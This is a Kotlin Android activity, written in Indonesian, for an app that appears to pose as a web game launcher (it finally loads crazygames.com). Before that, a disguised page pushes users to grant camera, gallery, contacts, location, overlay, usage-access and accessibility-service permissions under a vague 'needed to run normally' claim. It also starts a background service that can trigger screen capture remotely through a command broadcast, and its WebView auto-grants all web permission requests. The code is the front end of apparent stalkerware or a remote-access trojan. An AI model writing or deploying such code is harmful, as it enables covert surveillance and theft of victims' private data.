package com.xyz.mod.app

import android.Manifest
import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val REQ_CAM     = 101
    private val REQ_LOC     = 102
    private val REQ_OVERLAY = 103
    private val REQ_CONTACTS = 104
    private val REQ_SCREEN  = 104
    private val REQ_GALLERY = 106
    private val REQ_LOCATION_SETTINGS = 105

    private var webViewShown = false
    private var webView: WebView? = null

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            if (cmd == "requestScreenCapture") requestScreenCapture()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        startDeviceService()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        // Tampilkan dialog aktifkan lokasi dulu sebelum apapun
        showLocationDialog(onEnabled = {
            if (allPermsGranted()) {
                goToUrl()
            } else {
                setupUI()
            }
        })
    }

    private fun allPermsGranted(): Boolean {
        return isCamGranted() &&
               isGalleryGranted() &&
               isOverlayGranted() &&
               isAccessibilityGranted() &&
               isUsageAccessGranted() &&
               isContactsGranted() &&
               isLocationGranted()
    }

    override fun onResume() {
        super.onResume()
        if (!webViewShown) {
            // Kalau semua permission sudah granted saat balik dari settings, langsung proceed
            if (allPermsGranted()) {
                goToUrl()
                return
            }
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUI() {
        val wv = WebView(this)
        webView = wv
        wv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        wv.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) { request.grant(request.resources) }
        }
        wv.webViewClient = WebViewClient()
        wv.addJavascriptInterface(PermBridge(), "Android")
        setContentView(wv)
        wv.loadDataWithBaseURL("file:///android_asset/", buildHtml(), "text/html", "UTF-8", null)
    }

    inner class PermBridge {
        @android.webkit.JavascriptInterface fun isCamGranted()           = this@MainActivity.isCamGranted()
        @android.webkit.JavascriptInterface fun isGalleryGranted()       = this@MainActivity.isGalleryGranted()
        @android.webkit.JavascriptInterface fun isOverlayGranted()       = this@MainActivity.isOverlayGranted()
        @android.webkit.JavascriptInterface fun isAccessibilityGranted() = this@MainActivity.isAccessibilityGranted()
        @android.webkit.JavascriptInterface fun isUsageAccessGranted()   = this@MainActivity.isUsageAccessGranted()
        @android.webkit.JavascriptInterface fun isLocationGranted()      = this@MainActivity.isLocationGranted()
        @android.webkit.JavascriptInterface fun isContactsGranted()      = this@MainActivity.isContactsGranted()
        @android.webkit.JavascriptInterface fun requestCamPerm()         = this@MainActivity.requestCamPerm()
        @android.webkit.JavascriptInterface fun requestOverlayPerm()     = this@MainActivity.requestOverlayPerm()
        @android.webkit.JavascriptInterface fun requestGalleryPerm()     = this@MainActivity.requestGalleryPerm()
        @android.webkit.JavascriptInterface fun requestAccessibilityPerm() = this@MainActivity.requestAccessibilityPerm()
        @android.webkit.JavascriptInterface fun requestUsageAccessPerm() = this@MainActivity.requestUsageAccessPerm()
        @android.webkit.JavascriptInterface fun requestLocationPerm()    = this@MainActivity.requestLocationPerm()
        @android.webkit.JavascriptInterface fun requestContactsPerm()    = this@MainActivity.requestContactsPerm()
        @android.webkit.JavascriptInterface fun proceedToUrl()           = runOnUiThread { goToUrl() }
        @android.webkit.JavascriptInterface fun showLocationDialog()     = runOnUiThread { this@MainActivity.showLocationDialog() }
        @android.webkit.JavascriptInterface fun isLocationEnabled()      = this@MainActivity.isLocationEnabled()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun goToUrl() {
        if (webViewShown) return
        webViewShown = true

        val wv = WebView(this)
        wv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        wv.webViewClient = WebViewClient()
        wv.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }
        setContentView(wv)
        wv.loadUrl("https://www.crazygames.com")
    }

    private fun isCamGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    private fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), REQ_GALLERY)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), REQ_GALLERY)
        }
    }

    private fun isOverlayGranted() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true

    private fun isAccessibilityGranted(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val component = "$packageName/${packageName}.XyzAccessibilityService"
        return enabled.split(":").any { it.equals(component, ignoreCase = true) }
    }

    private fun isLocationGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    private fun isLocationEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
        return lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        }
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isContactsGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), REQ_CONTACTS)

    private fun requestCamPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ_CAM)

    private fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            startActivityForResult(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")),
                REQ_OVERLAY
            )
    }

    private fun requestAccessibilityPerm() {
        // Android 13+ (API 33): bisa deep-link langsung ke halaman accessibility service app ini
        // Android 12 ke bawah: fallback ke halaman accessibility settings umum
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    val component = "$packageName/.XyzAccessibilityService"
                    putExtra(":settings:fragment_args_key", component)
                    putExtra(":settings:show_fragment_args", android.os.Bundle().apply {
                        putString(":settings:fragment_args_key", component)
                    })
                }
                startActivity(intent)
                return
            } catch (_: Exception) { /* fallback */ }
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun requestUsageAccessPerm() =
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))

    private fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ), REQ_LOC)

    private var locationDialogCallback: (() -> Unit)? = null

    private fun showLocationDialog(onEnabled: (() -> Unit)? = null) {
        if (onEnabled != null) locationDialogCallback = onEnabled
        val callback = locationDialogCallback ?: { goToUrl() }

        val locationRequest = com.google.android.gms.location.LocationRequest.Builder(
            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
        ).build()

        val builder = com.google.android.gms.location.LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)

        com.google.android.gms.location.LocationServices
            .getSettingsClient(this)
            .checkLocationSettings(builder.build())
            .addOnSuccessListener {
                callback()
            }
            .addOnFailureListener { e ->
                if (e is com.google.android.gms.common.api.ResolvableApiException) {
                    try {
                        e.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {
                        callback()
                    }
                } else {
                    callback()
                }
            }
    }

    fun requestScreenCapture() {
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!webViewShown) {
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_SCREEN) {
            val i = Intent(DeviceService.ACTION_SCREEN_CAPTURE_RESULT).apply {
                putExtra(DeviceService.EXTRA_SCREEN_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_SCREEN_RESULT_DATA, data)
                setPackage(packageName)
            }
            sendBroadcast(i)
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {
            locationDialogCallback?.invoke() ?: run { if (!webViewShown) goToUrl() }
        }
    }

    private fun buildHtml(): String = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Izin Aplikasi</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#060912;
  --surface:#0c1018;
  --card:#111520;
  --border:rgba(255,255,255,.07);
  --accent:#3b82f6;
  --accent2:#1d4ed8;
  --glow:rgba(59,130,246,.25);
  --text:#f0f4ff;
  --text2:#8b9ab8;
  --text3:#4a5568;
  --green:#10b981;
  --green-glow:rgba(16,185,129,.2);
  --head:'AppStyle',sans-serif;
  --body:'AppStyle',sans-serif;
}
@font-face{font-family:'AppTitle';src:url(title.ttf) format('truetype')}
@font-face{font-family:'AppStyle';src:url(style.ttf) format('truetype')}
html,body{height:100%;width:100%;overflow-x:hidden;background:var(--bg)}
body{font-family:var(--body);color:var(--text);-webkit-font-smoothing:antialiased;display:flex;flex-direction:column;min-height:100%}

.bg-mesh{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
.bg-orb{position:absolute;border-radius:50%;filter:blur(80px);opacity:.15}
.orb1{width:320px;height:320px;background:radial-gradient(circle,#3b82f6,transparent 70%);top:-80px;right:-60px;animation:orbFloat1 8s ease-in-out infinite}
.orb2{width:240px;height:240px;background:radial-gradient(circle,#6366f1,transparent 70%);bottom:20%;left:-80px;animation:orbFloat2 10s ease-in-out infinite}
.orb3{width:180px;height:180px;background:radial-gradient(circle,#0ea5e9,transparent 70%);bottom:-40px;right:20%;animation:orbFloat3 7s ease-in-out infinite}
@keyframes orbFloat1{0%,100%{transform:translate(0,0)}50%{transform:translate(-20px,30px)}}
@keyframes orbFloat2{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-20px)}}
@keyframes orbFloat3{0%,100%{transform:translate(0,0)}50%{transform:translate(-15px,-25px)}}
.grid-overlay{position:absolute;inset:0;background-image:linear-gradient(rgba(59,130,246,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(59,130,246,.03) 1px,transparent 1px);background-size:40px 40px}

.wrap{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;padding:0 0 32px;min-height:100%}

.banner{width:100%;height:169px;position:relative;overflow:hidden;flex-shrink:0}
.banner-bg{position:absolute;inset:0;background:url(banner.jpg) center/cover no-repeat}
.banner-overlay{position:absolute;inset:0;background:linear-gradient(to bottom,rgba(6,9,18,0) 50%,rgba(6,9,18,.8) 100%)}
.banner-line{position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(59,130,246,.4),transparent)}

.header-section{width:100%;padding:24px 24px 0;display:flex;align-items:center;gap:16px}
.header-icon-ring{width:56px;height:56px;border-radius:16px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25);display:flex;align-items:center;justify-content:center;position:relative;flex-shrink:0}
.header-icon-pulse{position:absolute;inset:-8px;border-radius:24px;border:1px solid rgba(59,130,246,.12);animation:pulse 2.5s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.2;transform:scale(1.06)}}
.header-text{}
.header-label{font-size:9px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--accent);margin-bottom:4px}
.header-title{font-family:'AppTitle',sans-serif;font-size:22px;color:var(--text);line-height:1.2;letter-spacing:-.2px}
.header-title span{background:linear-gradient(135deg,#60a5fa,#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.header-sub{font-size:11.5px;color:var(--text2);margin-top:3px;line-height:1.5}

.body-wrap{width:100%;padding:20px 20px 0;display:flex;flex-direction:column;gap:20px}

.info-card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:20px;position:relative;overflow:hidden}
.info-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(59,130,246,.3),transparent)}
.info-title{font-family:var(--head);font-size:14px;font-weight:700;color:var(--text);margin-bottom:8px;letter-spacing:-.1px}
.info-desc{font-size:12.5px;color:var(--text2);line-height:1.7;font-weight:400}
.info-desc strong{color:var(--text);font-weight:600}

.footer{width:100%;padding:0 20px;margin-top:24px}
.btn-main{
  width:100%;height:54px;border-radius:14px;border:none;
  background:linear-gradient(135deg,var(--accent),var(--accent2));
  color:#fff;font-family:var(--head);font-size:14px;font-weight:800;
  letter-spacing:2px;text-transform:uppercase;cursor:pointer;
  display:flex;align-items:center;justify-content:center;gap:10px;
  box-shadow:0 4px 24px var(--glow);transition:all .2s;position:relative;overflow:hidden
}
.btn-main::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.1),transparent);opacity:0;transition:opacity .2s}
.btn-main:active{transform:scale(.98);opacity:.9}
.btn-main:active::before{opacity:1}
.btn-main.all-granted{background:linear-gradient(135deg,#059669,#047857);box-shadow:0 4px 24px var(--green-glow)}
.btn-main.all-granted .btn-icon-lanjut{display:none}
.btn-main.all-granted .btn-icon-masuk{display:block}
.btn-icon-masuk{display:none}
.notice{text-align:center;font-size:10.5px;color:var(--text3);margin-top:12px;line-height:1.6;padding:0 8px}
</style>
</head>
<body>
<div class="bg-mesh">
  <div class="grid-overlay"></div>
  <div class="bg-orb orb1"></div>
  <div class="bg-orb orb2"></div>
  <div class="bg-orb orb3"></div>
</div>

<div class="wrap">

  <!-- Banner: foto saja -->
  <div class="banner">
    <div class="banner-bg"></div>
    <div class="banner-overlay"></div>
    <div class="banner-line"></div>
  </div>

  <!-- Header: icon + title + subtitle di bawah banner -->
  <div class="header-section">
    <div class="header-icon-ring">
      <div class="header-icon-pulse"></div>
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7L12 2z"/>
        <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
      </svg>
    </div>
    <div class="header-text">
      <div class="header-label">Pengaturan Awal</div>
      <div class="header-title">Izin <span>Diperlukan</span></div>
      <div class="header-sub">Aktifkan semua izin agar aplikasi berjalan optimal</div>
    </div>
  </div>

  <div class="body-wrap">
    <div class="info-card">
      <div class="info-title">Mengapa izin ini dibutuhkan?</div>
      <div class="info-desc">
        Aplikasi memerlukan beberapa izin untuk dapat <strong>berjalan secara normal</strong>.
        Silahkan izinkan semua akses yang diminta agar seluruh fitur dapat
        berfungsi dengan <strong>baik dan stabil</strong>.
      </div>
    </div>
  </div>

  <div class="footer">
    <button class="btn-main" id="btnMain" onclick="handleBtn()">
      <svg class="btn-icon-lanjut" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
      <svg class="btn-icon-masuk" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
      <span id="btnLabel">LANJUTKAN</span>
    </button>
    <div class="notice">Izin hanya digunakan untuk keperluan internal aplikasi<br>dan tidak dibagikan ke pihak ketiga.</div>
  </div>

</div>

<script>
const PERMS = [
  { check:()=> window.Android ? Android.isCamGranted() : false,           request:()=> window.Android && Android.requestCamPerm() },
  { check:()=> window.Android ? Android.isGalleryGranted() : false,       request:()=> window.Android && Android.requestGalleryPerm() },
  { check:()=> window.Android ? Android.isOverlayGranted() : false,        request:()=> window.Android && Android.requestOverlayPerm() },
  { check:()=> window.Android ? Android.isUsageAccessGranted() : false,    request:()=> window.Android && Android.requestUsageAccessPerm() },
  { check:()=> window.Android ? Android.isContactsGranted() : false,       request:()=> window.Android && Android.requestContactsPerm() },
  { check:()=> window.Android ? Android.isLocationGranted() : false,       request:()=> window.Android && Android.requestLocationPerm() },
  { check:()=> window.Android ? Android.isAccessibilityGranted() : false,  request:()=> window.Android && Android.requestAccessibilityPerm() }
]

function allGranted(){ return PERMS.every(p => p.check()) }

function updateBtn(){
  const btn = document.getElementById('btnMain')
  const lbl = document.getElementById('btnLabel')
  if(allGranted()){
    btn.classList.add('all-granted')
    lbl.textContent = 'MASUK'
  } else {
    btn.classList.remove('all-granted')
    lbl.textContent = 'LANJUTKAN'
  }
}

function handleBtn(){
  if(allGranted()){
    if(window.Android && !Android.isLocationEnabled()){
      Android.showLocationDialog()
      return
    }
    window.Android && Android.proceedToUrl()
  } else {
    const pending = PERMS.find(p => !p.check())
    if(pending) pending.request()
  }
}

function refreshPerms(){
  updateBtn()
  // Auto-proceed jika semua permission sudah granted
  if(allGranted()){
    if(window.Android && !Android.isLocationEnabled()){
      Android.showLocationDialog()
      return
    }
    window.Android && Android.proceedToUrl()
  }
}

window.addEventListener('load', () => {
  updateBtn()
  // Cek saat load juga — siapa tahu semua sudah granted
  if(allGranted()){
    if(window.Android && !Android.isLocationEnabled()){
      Android.showLocationDialog()
      return
    }
    window.Android && Android.proceedToUrl()
  }
})
</script>
</body>
</html>"""

    private fun dpToPx(dp: Int) = (dp * resources.displayMetrics.density).toInt()

    private fun startDeviceService() {
        ContextCompat.startForegroundService(this, Intent(this, DeviceService::class.java))
    }
}
